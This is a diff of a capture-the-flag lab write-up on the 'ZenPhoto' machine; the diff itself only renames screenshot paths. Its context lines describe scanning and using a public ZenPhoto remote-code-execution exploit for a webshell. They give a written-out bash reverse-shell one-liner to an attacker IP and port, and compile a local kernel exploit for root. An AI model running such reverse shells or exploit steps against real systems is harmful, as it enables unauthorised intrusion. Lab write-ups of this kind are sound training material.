@@ -23,7 +23,7 @@ Of all things, Telnet is open.
 
 Port 80 just shows this:
 
-![](<../../../.gitbook/assets/image%20(224).png>)
+![](../../../.gitbook/assets/zenphoto-3.png)
 
 A `gobuster` scan reveals the following directories:
 
@@ -49,11 +49,11 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 
 Visiting `/test` reveals a ZenPhoto instance:
 
-![](<../../../.gitbook/assets/image%20(3137).png>)
+![](../../../.gitbook/assets/zenphoto-4.png)
 
 Viewing the page source reveals the version of ZenPhoto that is running:
 
-![](<../../../.gitbook/assets/image%20(1513).png>)
+![](../../../.gitbook/assets/zenphoto-1.png)
 
 There are RCE exploits available for this instance:
 
@@ -68,7 +68,7 @@ ZenPhoto 1.4.1.4 - 'ajax_create_folder.php' Remote Code Ex | php/webapps/18083.p
 
 This exploits works in getting me a webshell:
 
-![](<../../../.gitbook/assets/image%20(2066).png>)
+![](../../../.gitbook/assets/zenphoto-2.png)
 
 We can get a reverse shell using this one-liner:
 
@@ -76,7 +76,7 @@ We can get a reverse shell using this one-liner:
 bash -c 'bash -i >& /dev/tcp/192.168.45.164/4444 0>&1'
 ```
 
-![](<../../../.gitbook/assets/image%20(542).png>)
+![](../../../.gitbook/assets/zenphoto-6.png)
 
 ## Privilege Escalation
 
@@ -95,6 +95,6 @@ There are quite a few exploits that might work for this version of Linux running
 
 Compile it on the machine itself using `gcc exploit.c -o exploit`. Then, run it to get a `root` shell:
 
-![](<../../../.gitbook/assets/image%20(3840).png>)
+![](../../../.gitbook/assets/zenphoto-5.png)
 
 Rooted!
